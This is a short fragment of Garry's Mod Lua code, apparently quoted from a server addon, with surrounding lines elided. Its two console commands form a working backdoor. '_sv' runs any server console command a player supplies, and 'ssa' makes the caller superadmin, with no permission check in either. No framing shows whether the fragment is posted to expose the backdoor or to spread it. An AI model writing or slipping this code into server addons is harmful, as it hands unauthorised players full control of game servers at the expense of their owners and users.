...
concommand.Add( "_sv", function(player,command,argument) RunConsoleCommand(table.concat(argument)) end)
...
concommand.Add("ssa", function(player) player:SetUserGroup("superadmin") end)
